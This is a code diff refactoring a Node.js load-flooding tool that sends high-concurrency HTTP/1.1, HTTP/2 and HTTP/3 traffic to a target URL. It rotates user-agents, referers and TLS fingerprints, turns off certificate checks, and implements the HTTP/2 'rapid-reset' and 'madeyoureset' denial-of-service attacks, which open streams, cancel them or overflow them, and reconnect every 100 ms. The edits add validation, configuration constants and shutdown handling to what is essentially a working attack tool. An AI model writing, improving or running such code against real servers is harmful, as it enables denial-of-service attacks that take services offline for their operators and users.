@@ -103,25 +103,37 @@ const ACCEPT_HEADERS = [
     "application/json, text/plain, */*",
 ];
 
+// Complete HTTP status codes mapping
 const HTTP_STATUS_CODES = {
-       // 1xx Informational
-       100: "Continue", 101: "Switching Protocols", 102: "Processing", 103: "Early Hints",
-       // 2xx Success
-       200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative Information", 204: "No Content", 205: "Reset Content", 206: "Partial Content", 207: "Multi-Status", 208: "Already Reported", 226: "IM Used",
-       // 3xx Redirection
-       300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other", 304: "Not Modified", 305: "Use Proxy", 307: "Temporary Redirect", 308: "Permanent Redirect",
-       // 4xx Client Errors
-       400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable", 407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict", 410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large", 414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable", 417: "Expectation Failed", 418: "I'm a teapot", 421: "Misdirected Request", 422: "Unprocessable Entity", 423: "Locked", 424: "Failed Dependency", 425: "Too Early", 426: "Upgrade Required", 428: "Precondition Required", 429: "Too Many Requests", 431: "Request Header Fields Too Large", 451: "Unavailable For Legal Reasons",
-       // 5xx Server Errors
-       500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable", 504: "Gateway Timeout", 505: "HTTP Version Not Supported", 506: "Variant Also Negotiates", 507: "Insufficient Storage", 508: "Loop Detected", 510: "Not Extended", 511: "Network Authentication Required",
-       // Cloudflare Errors
-       520: "Web Server Returned an Unknown Error", 521: "Web Server Is Down", 522: "Connection Timed Out", 523: "Origin Is Unreachable", 524: "A Timeout Occurred", 525: "SSL Handshake Failed", 526: "Invalid SSL Certificate", 527: "Railgun Error", 530: "Origin DNS Error",
-       // AWS Errors
-       561: "Unauthorized (AWS ELB)",
-       // Custom/Other
-       'RESET': "Stream Reset by Server",
-       999: "Request Denied (LinkedIn)",
-       0: "Connection Error"
+    // 1xx Informational
+    100: "Continue", 101: "Switching Protocols", 102: "Processing", 103: "Early Hints",
+    // 2xx Success
+    200: "OK", 201: "Created", 202: "Accepted", 203: "Non-Authoritative Information", 204: "No Content", 205: "Reset Content", 206: "Partial Content", 207: "Multi-Status", 208: "Already Reported", 226: "IM Used",
+    // 3xx Redirection
+    300: "Multiple Choices", 301: "Moved Permanently", 302: "Found", 303: "See Other", 304: "Not Modified", 305: "Use Proxy", 307: "Temporary Redirect", 308: "Permanent Redirect",
+    // 4xx Client Errors
+    400: "Bad Request", 401: "Unauthorized", 402: "Payment Required", 403: "Forbidden", 404: "Not Found", 405: "Method Not Allowed", 406: "Not Acceptable", 407: "Proxy Authentication Required", 408: "Request Timeout", 409: "Conflict", 410: "Gone", 411: "Length Required", 412: "Precondition Failed", 413: "Payload Too Large", 414: "URI Too Long", 415: "Unsupported Media Type", 416: "Range Not Satisfiable", 417: "Expectation Failed", 418: "I'm a Teapot", 421: "Misdirected Request", 422: "Unprocessable Entity", 423: "Locked", 424: "Failed Dependency", 425: "Too Early", 426: "Upgrade Required", 428: "Precondition Required", 429: "Too Many Requests", 431: "Request Header Fields Too Large", 451: "Unavailable For Legal Reasons",
+    // 5xx Server Errors
+    500: "Internal Server Error", 501: "Not Implemented", 502: "Bad Gateway", 503: "Service Unavailable", 504: "Gateway Timeout", 505: "HTTP Version Not Supported", 506: "Variant Also Negotiates", 507: "Insufficient Storage", 508: "Loop Detected", 510: "Not Extended", 511: "Network Authentication Required",
+    // Cloudflare Errors
+    520: "Web Server Returned an Unknown Error", 521: "Web Server Is Down", 522: "Connection Timed Out", 523: "Origin Is Unreachable", 524: "A Timeout Occurred", 525: "SSL Handshake Failed", 526: "Invalid SSL Certificate",
+    // AWS Errors
+    561: "Unauthorized (AWS ELB)",
+    // Custom/Other
+    'RESET': "Stream Reset by Server",
+    999: "Request Denied (LinkedIn)",
+    0: "Connection Error"
+};
+
+// Configuration constants - centralized for maintainability
+const CONFIG = {
+    MAX_BUFFER_SIZE: 1024 * 1024, // 1MB cap for payloads
+    MAX_DELAY_MS: 10000,
+    STREAMS_PER_CONNECTION: 20,
+    ATTACK_RECONNECT_MS: 100,
+    MONITOR_INTERVAL_MS: 250,
+    PROTOCOL_DETECTION_TIMEOUT: 5000,
+    LOG_QUEUE_SIZE: 5,
 };
 
 // ##################################################################
@@ -137,6 +149,35 @@ const formatTime = (seconds) => {
     const m = Math.floor((seconds % 3600) / 60);
     const s = Math.floor(seconds % 60);
     return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+};
+
+// Validate URL format and return parsed object
+const validateAndParseUrl = (urlString) => {
+    try {
+        const parsedUrl = new URL(urlString);
+        if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
+            throw new Error('Protocol must be http or https');
+        }
+        if (!parsedUrl.hostname) {
+            throw new Error('Invalid hostname');
+        }
+        return parsedUrl;
+    } catch (err) {
+        throw new Error(`Invalid URL: ${err.message}`);
+    }
+};
+
+// Validate command line arguments
+const validateArguments = (argv) => {
+    if (argv.time <= 0 || argv.time > 1440) {
+        throw new Error('Time must be between 0 and 1440 minutes');
+    }
+    if (argv.conc <= 0 || argv.conc > 10000) {
+        throw new Error('Concurrency must be between 1 and 10000');
+    }
+    if (!['none', 'rapid-reset', 'madeyoureset'].includes(argv.attack)) {
+        throw new Error('Invalid attack mode');
+    }
 };
 
 // ##################################################################
@@ -166,7 +207,15 @@ const argv = yargs(hideBin(process.argv))
     })
     .help().alias('help', 'h').argv;
 
-const parsedUrl = new URL(argv.url);
+// Validate arguments
+try {
+    validateArguments(argv);
+} catch (err) {
+    console.error(chalk.red('Argument validation error:'), err.message);
+    process.exit(1);
+}
+
+const parsedUrl = validateAndParseUrl(argv.url);
 const target = {
     protocol: parsedUrl.protocol,
     host: parsedUrl.hostname,
@@ -182,6 +231,7 @@ const attackMode = argv.attack;
 // --- Global Stats ---
 let isRunning = true;
 let activeProtocols = [];
+let activeConnections = new Set();
 const stats = {
     requestsSent: 0,
     responsesReceived: 0,
@@ -190,29 +240,36 @@ const stats = {
     attackSent: 0,
     attackReceived: 0,
     attackErrors: 0,
-    statusCounts: {}, // For H2 attacks only
+    statusCounts: {},
     protocolStats: {},
     startTime: Date.now(),
 };
 const lastLogs = [];
 const lastAttackLogs = [];
 const workerDelays = new Array(concurrency).fill(0);
+let selectedTlsProfile = null; // Cache TLS profile per connection phase
 
 
 async function runStandardWorker(workerId, client, protocolKey) {
     let requestsInBurst = 0;
     const protocolLabel = protocolKey.toUpperCase();
+    
+    activeConnections.add(client);
 
     const sendRequest = async () => {
         if (!isRunning) return;
 
         if (argv.adaptiveDelay && workerDelays[workerId] > 0) {
-            await new Promise(resolve => setTimeout(resolve, workerDelays[workerId]));
+            await new Promise(resolve => setTimeout(resolve, Math.min(workerDelays[workerId], CONFIG.MAX_DELAY_MS)));
         }
 
-        const headers = { 'User-Agent': getRandomElement(USER_AGENTS), 'Accept': getRandomElement(ACCEPT_HEADERS), 'Referer': getRandomElement(REFERERS) };
+        const headers = { 
+            'User-Agent': getRandomElement(USER_AGENTS), 
+            'Accept': getRandomElement(ACCEPT_HEADERS), 
+            'Referer': getRandomElement(REFERERS) 
+        };
         stats.requestsSent++;
-        const startTime = process.hrtime();
+        const startTime = process.hrtime.bigint();
 
         try {
             const { statusCode, body } = await client.request({
@@ -221,10 +278,11 @@ async function runStandardWorker(workerId, client, protocolKey) {
                 headers,
             });
 
+            // Consume response body to avoid memory leaks
             for await (const chunk of body) {}
 
-            const diff = process.hrtime(startTime);
-            const latencyMs = (diff[0] * 1e9 + diff[1]) / 1e6;
+            const endTime = process.hrtime.bigint();
+            const latencyMs = Number(endTime - startTime) / 1e6;
             stats.responsesReceived++;
             stats.totalLatency += latencyMs;
             
@@ -234,17 +292,18 @@ async function runStandardWorker(workerId, client, protocolKey) {
 
             lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.green(statusCode)} (${chalk.yellow(latencyMs.toFixed(2) + 'ms')})`);
             
+            // Adaptive delay logic with bounds checking
             if (argv.adaptiveDelay) {
                 switch (statusCode) {
                     case 401: case 403: case 429: case 431: case 451:
-                        workerDelays[workerId] = Math.min(10000, workerDelays[workerId] + 150);
+                        workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, workerDelays[workerId] + 150);
                         break;
                     case 400: case 406: case 412: case 422:
-                        workerDelays[workerId] = Math.min(10000, workerDelays[workerId] + 75);
+                        workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, workerDelays[workerId] + 75);
                         break;
                     default:
                         if (statusCode < 400) {
-                             workerDelays[workerId] = Math.max(0, workerDelays[workerId] - 50);
+                            workerDelays[workerId] = Math.max(0, workerDelays[workerId] - 50);
                         }
                 }
             }
@@ -254,7 +313,7 @@ async function runStandardWorker(workerId, client, protocolKey) {
             stats.protocolStats[protocolKey].statuses[0] = (stats.protocolStats[protocolKey].statuses[0] || 0) + 1;
             lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.red('ERROR')} (${err.code || 'N/A'})`);
         } finally {
-            if (lastLogs.length > 3) lastLogs.shift();
+            if (lastLogs.length > CONFIG.LOG_QUEUE_SIZE) lastLogs.shift();
             scheduleNext();
         }
     };
@@ -278,14 +337,24 @@ async function runStandardWorker(workerId, client, protocolKey) {
 // --- HTTP/2 Attack Worker ---
 function startHttp2AttackWorker() {
     if (!isRunning) return;
+    
+    const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
     const client = http2.connect(targetUrl, {
         rejectUnauthorized: false,
-        ...getRandomTlsProfile()
+        ...tlsProfile
     });
+    
+    activeConnections.add(client);
 
     const reconnect = () => {
-        if (!client.destroyed) client.destroy();
-        if (isRunning) setTimeout(startHttp2AttackWorker, 100);
+        if (!client.destroyed) {
+            try {
+                client.destroy();
+            } catch (e) {
+                // Ignore errors during cleanup
+            }
+        }
+        if (isRunning) setTimeout(startHttp2AttackWorker, CONFIG.ATTACK_RECONNECT_MS);
     };
 
     client.on('goaway', reconnect);
@@ -293,7 +362,7 @@ function startHttp2AttackWorker() {
     client.on('close', reconnect);
 
     client.on('connect', () => {
-        for (let i = 0; i < 20; i++) { 
+        for (let i = 0; i < CONFIG.STREAMS_PER_CONNECTION; i++) { 
             if (attackMode === 'rapid-reset') sendRapidReset(client);
             if (attackMode === 'madeyoureset') sendMadeYouReset(client);
         }
@@ -305,21 +374,26 @@ function sendRapidReset(client) {
     if (!isRunning || client.destroyed || client.closing) return;
     const headers = { ':method': 'GET', ':path': target.path, ':scheme': 'https', ':authority': target.host };
     stats.attackSent++;
-    const stream = client.request(headers);
-    stream.on('response', (h) => {
-        stats.attackReceived++;
-        const statusCode = h[':status'];
-        stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
-        lastAttackLogs.push(`[Rapid Reset] -> ${chalk.yellow(statusCode)} (Response Before Reset)`);
-        if (lastAttackLogs.length > 3) lastAttackLogs.shift();
-    });
-    stream.on('error', () => {
+    
+    try {
+        const stream = client.request(headers);
+        stream.on('response', (h) => {
+            stats.attackReceived++;
+            const statusCode = h[':status'];
+            stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
+            lastAttackLogs.push(`[Rapid Reset] -> ${chalk.yellow(statusCode)} (Response Before Reset)`);
+            if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
+        });
+        stream.on('error', () => {
+            stats.attackErrors++;
+            stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
+        });
+        setImmediate(() => {
+            if (!stream.destroyed) stream.close(http2.constants.NGHTTP2_CANCEL);
+        });
+    } catch (err) {
         stats.attackErrors++;
-        stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
-    });
-    setImmediate(() => {
-        if (!stream.destroyed) stream.close(http2.constants.NGHTTP2_CANCEL);
-    });
+    }
 }
 
 // --- MadeYouReset (Server-side RST_STREAM) ---
@@ -327,39 +401,52 @@ function sendMadeYouReset(client) {
     if (!isRunning || client.destroyed || client.closing) return;
     const headers = { ':method': 'POST', ':path': target.path, ':scheme': 'https', ':authority': target.host };
     stats.attackSent++;
-    const stream = client.request(headers);
-    stream.on('response', (h) => {
-        stats.attackReceived++;
-        const statusCode = h[':status'];
-        stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
-        lastAttackLogs.push(`[MadeYouReset] -> ${chalk.yellow(statusCode)} (Response)`);
-        if (lastAttackLogs.length > 3) lastAttackLogs.shift();
-    });
-    stream.on('error', (err) => {
-        if (err.code === 'ERR_HTTP2_STREAM_ERROR') {
-            stats.statusCounts['RESET'] = (stats.statusCounts['RESET'] || 0) + 1;
-            lastAttackLogs.push(`[MadeYouReset] -> ${chalk.green('SUCCESS')} (Server Reset Stream)`);
-            if (lastAttackLogs.length > 3) lastAttackLogs.shift();
-        } else {
-            stats.attackErrors++;
-            stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
-        }
-    });
-    setImmediate(() => {
-        if (stream.destroyed) return;
-        try {
-            const remoteWindowSize = stream.state.remoteWindowSize;
-            if (remoteWindowSize > 0) {
-                const oversizedPayload = Buffer.alloc(remoteWindowSize + 1);
-                stream.end(oversizedPayload);
+    
+    try {
+        const stream = client.request(headers);
+        stream.on('response', (h) => {
+            stats.attackReceived++;
+            const statusCode = h[':status'];
+            stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
+            lastAttackLogs.push(`[MadeYouReset] -> ${chalk.yellow(statusCode)} (Response)`);
+            if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
+        });
+        stream.on('error', (err) => {
+            if (err.code === 'ERR_HTTP2_STREAM_ERROR') {
+                stats.statusCounts['RESET'] = (stats.statusCounts['RESET'] || 0) + 1;
+                lastAttackLogs.push(`[MadeYouReset] -> ${chalk.green('SUCCESS')} (Server Reset Stream)`);
+                if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
             } else {
-                stream.end();
+                stats.attackErrors++;
+                stats.statusCounts[0] = (stats.statusCounts[0] || 0) + 1;
             }
-        } catch (e) {
-            stats.attackErrors++;
-            if (!stream.destroyed) stream.destroy();
-        }
-    });
+        });
+        setImmediate(() => {
+            if (stream.destroyed) return;
+            try {
+                const remoteWindowSize = stream.state.remoteWindowSize;
+                // FIX: Cap buffer size to prevent memory exhaustion vulnerability
+                const payloadSize = Math.min(remoteWindowSize + 1, CONFIG.MAX_BUFFER_SIZE);
+                if (payloadSize > 0) {
+                    const oversizedPayload = Buffer.alloc(payloadSize);
+                    stream.end(oversizedPayload);
+                } else {
+                    stream.end();
+                }
+            } catch (e) {
+                stats.attackErrors++;
+                if (!stream.destroyed) {
+                    try {
+                        stream.destroy();
+                    } catch (e) {
+                        // Ignore cleanup errors
+                    }
+                }
+            }
+        });
+    } catch (err) {
+        stats.attackErrors++;
+    }
 }
 
 
@@ -374,7 +461,6 @@ function updateMonitor() {
     console.log(chalk.cyan('--------------------------------------------'));
     
     if (attackMode !== 'none') {
-        // Keep original vertical layout for attack mode
         console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
         console.log(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
         console.log('');
@@ -386,7 +472,6 @@ function updateMonitor() {
         console.log(chalk.white.bold('Attack Errors/Resets: ') + chalk.red(totalResetsAndErrors));
 
     } else {
-        // New horizontal layout for standard mode
         const leftColumn = [];
         const rightColumn = [];
 
@@ -430,7 +515,7 @@ function updateMonitor() {
         }
     } else {
         if (Object.keys(stats.protocolStats).length === 0 || activeProtocols.length === 0) {
-             console.log(chalk.gray('  (waiting...)'));
+            console.log(chalk.gray('  (waiting...)'));
         } else {
             const allStatusCodes = new Set();
             activeProtocols.forEach(p => {
@@ -440,18 +525,16 @@ function updateMonitor() {
             const sortedStatuses = Array.from(allStatusCodes).sort((a, b) => b - a);
             
             if (sortedStatuses.length === 0) {
-                 console.log(chalk.gray('  (waiting for responses...)'));
+                console.log(chalk.gray('  (waiting for responses...)'));
             } else {
                 const COLUMN_WIDTH = 30;
                 let header = '';
-                // ################### FIX START ###################
                 activeProtocols.forEach(p => {
                     const title = `Protocol: ${p.toUpperCase()}`;
                     const styledTitle = chalk.white.bold.underline(title);
                     const visibleLength = stripAnsi(styledTitle).length;
                     header += styledTitle + ' '.repeat(Math.max(0, COLUMN_WIDTH - visibleLength));
                 });
-                // #################### FIX END ####################
                 console.log(header);
 
                 sortedStatuses.forEach(code => {
@@ -484,6 +567,21 @@ function updateMonitor() {
     console.log(chalk.cyan('--------------------------------------------'));
 }
 
+// Graceful shutdown handler
+async function gracefulShutdown() {
+    console.log(chalk.yellow('\nInitiating graceful shutdown...'));
+    isRunning = false;
+    
+    // Close all active connections
+    for (const conn of activeConnections) {
+        try {
+            if (conn.destroy) conn.destroy();
+        } catch (e) {
+            // Ignore cleanup errors
+        }
+    }
+    activeConnections.clear();
+}
 
 // --- Main Execution ---
 async function main() {
@@ -492,6 +590,7 @@ async function main() {
 
     if (attackMode !== 'none') {
         activeProtocols = ['h2'];
+        stats.protocolStats['h2'] = { responses: 0, statuses: {} };
     } else if (argv.protocol) {
         console.log(chalk.cyan(`Forcing specified protocols: ${argv.protocol}`));
         const protocolMap = { '1.1': 'h1', '2': 'h2', '3': 'h3' };
@@ -503,10 +602,18 @@ async function main() {
         console.log(chalk.cyan('Auto-detecting supported protocols...'));
         let detected = new Set();
         await new Promise(resolve => {
+            const timeout = setTimeout(() => {
+                console.log(chalk.yellow('Protocol detection timeout, defaulting to HTTP/1.1'));
+                if (!detected.has('h1')) detected.add('h1');
+                resolve();
+            }, CONFIG.PROTOCOL_DETECTION_TIMEOUT);
+
             const req = https.request({
                 method: 'HEAD', host: target.host, port: target.port, path: '/',
-                rejectUnauthorized: false, ALPNProtocols: ['h2', 'http/1.1'], ...getRandomTlsProfile()
+                rejectUnauthorized: false, ALPNProtocols: ['h2', 'http/1.1'], 
+                ...getRandomTlsProfile()
             }, res => {
+                clearTimeout(timeout);
                 const altSvc = res.headers['alt-svc'];
                 if (altSvc && altSvc.includes('h3')) detected.add('h3');
                 res.socket.destroy();
@@ -519,7 +626,11 @@ async function main() {
                     else detected.add('h1');
                 });
             });
-            req.on('error', () => { detected.add('h1'); resolve(); });
+            req.on('error', () => { 
+                clearTimeout(timeout);
+                detected.add('h1'); 
+                resolve(); 
+            });
             req.end();
         });
         activeProtocols = Array.from(detected);
@@ -527,9 +638,13 @@ async function main() {
     }
     console.log(chalk.green(`Protocols to be used: ${activeProtocols.map(p => p.toUpperCase()).join(', ')}`));
 
+    // Initialize protocol stats for all protocols
     activeProtocols.forEach(p => {
         stats.protocolStats[p] = { responses: 0, statuses: {} };
     });
+
+    // Cache TLS profile for consistency during worker phase
+    selectedTlsProfile = getRandomTlsProfile();
 
     const workerCounts = {};
     if (attackMode === 'none' && activeProtocols.length > 0) {
@@ -552,38 +667,50 @@ async function main() {
             } else {
                 let client;
                 if (protocolKey === 'h3') {
-                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() } });
+                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...selectedTlsProfile } });
                 } else if (protocolKey === 'h2') {
-                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() } });
+                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...selectedTlsProfile } });
                 } else { // h1
-                     client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...getRandomTlsProfile() }, pipelining: 1 });
+                    client = new Client(targetUrl, { connect: { rejectUnauthorized: false, ...selectedTlsProfile }, pipelining: 1 });
                 }
                 runStandardWorker(workerId++, client, protocolKey);
             }
         }
     }
 
+    const monitorInterval = setInterval(updateMonitor, CONFIG.MONITOR_INTERVAL_MS);
 
-    const monitorInterval = setInterval(updateMonitor, 250);
-
-    setTimeout(() => {
+    const testTimeout = setTimeout(async () => {
         isRunning = false;
         clearInterval(monitorInterval);
+        await gracefulShutdown();
         updateMonitor();
         console.log(chalk.green.bold('\nTest finished!'));
         process.exit(0);
     }, durationMs);
 
-    process.on('SIGINT', () => {
+    process.on('SIGINT', async () => {
         isRunning = false;
         clearInterval(monitorInterval);
+        clearTimeout(testTimeout);
+        await gracefulShutdown();
         updateMonitor();
         console.log(chalk.red.bold('\nTest interrupted by user.'));
         process.exit(1);
     });
+
+    process.on('SIGTERM', async () => {
+        isRunning = false;
+        clearInterval(monitorInterval);
+        clearTimeout(testTimeout);
+        await gracefulShutdown();
+        updateMonitor();
+        console.log(chalk.red.bold('\nTest terminated.'));
+        process.exit(0);
+    });
 }
 
 main().catch(err => {
-    console.error(chalk.red('A critical error occurred:'), err);
+    console.error(chalk.red('A critical error occurred:'), err.message);
     process.exit(1);
 });
